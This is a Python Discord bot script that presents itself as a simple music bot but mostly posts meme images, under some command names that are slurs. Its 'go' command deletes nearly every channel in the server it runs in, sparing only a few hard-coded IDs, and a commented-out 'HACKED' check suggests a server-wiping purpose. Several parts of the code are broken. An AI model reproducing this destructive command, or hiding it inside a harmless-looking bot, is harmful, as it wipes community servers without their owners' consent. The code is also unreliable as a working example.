#!/usr/bin/env python3
import asyncio
import discord
import os
import random
from discord.ext import commands, tasks

def getRandomFile(path):
    """
    Returns a random filename, chosen among the files of the given path.
    """
    files = os.listdir(path)
    index = random.randrange(0, len(files))
    return files[index]
    
class Stats(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.guilds = []
        

    
class Audio(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    async def join(self, ctx, *, channel: discord.VoiceChannel):
        """Joins a voice channel"""
        
        if ctx.voice_client is not None:
            return await ctx.voice_client.move_to(channel)
        else:
            return await ctx.voice_client.move_to(bot.get_channel(247531960488951815))
            
        await channel.connect()
    
    @commands.command()
    async def hole(self, ctx):
        await ctx.send("https://i.imgur.com/1RrPdoT.jpg")
        
        
    @commands.command()
    async def retarded(self, ctx):
        await ctx.send("https://i.imgur.com/lu9cSMj.png")
        
    
    @commands.command()
    async def gifs(self, ctx):
        await ctx.send(file=discord.File('modest/gifs.png'))
        
    @commands.command()
    async def yo(self, ctx):
#        f = random.choice(os.listdir("modest"))
        f = getRandomFile("modest/")
        await ctx.send(file=discord.File("modest/" + str(f)))
        
        
    @commands.command()
    async def context(self, ctx):
#        f = random.choice(os.listdir("modest"))
        f = getRandomFile("icetray/")
        await ctx.send(file=discord.File("icetray/" + str(f)))
        
    @commands.command()
    async def hoe(self, ctx):
        await ctx.send("https://i.imgur.com/rb7P4G3.png")
        
    @commands.command()
    async def go(self, ctx):
        text_channel_list = []
        for c in ctx.guild.channels:
            print(c)
#            if "HACKED" in str(c):
#                await c.delete()
            if not c.type == 'Text' or c.id not in [814082608686039060, 814082608686039060, 814102361336184842, 818792764669296682, 813954468679909387]:
                try:
                    await c.delete()
                except:
                    continue
                text_channel_list.append(c)
                await ctx.send(c)
        await ctx.send(text_channel_list)

    @tasks.loop(seconds=30.0)
    async def printer(self):
        print("fuck")
        self.index += 1
            
bot = commands.Bot(command_prefix=commands.when_mentioned_or("i."),
                   description='Relatively simple music bot example')

@bot.event
async def on_ready():
    print('Logged in as {0} ({0.id})'.format(bot.user))
    print('------')
    
bot.add_cog(Stats(bot))
bot.add_cog(Audio(bot))
bot.run("xxc")

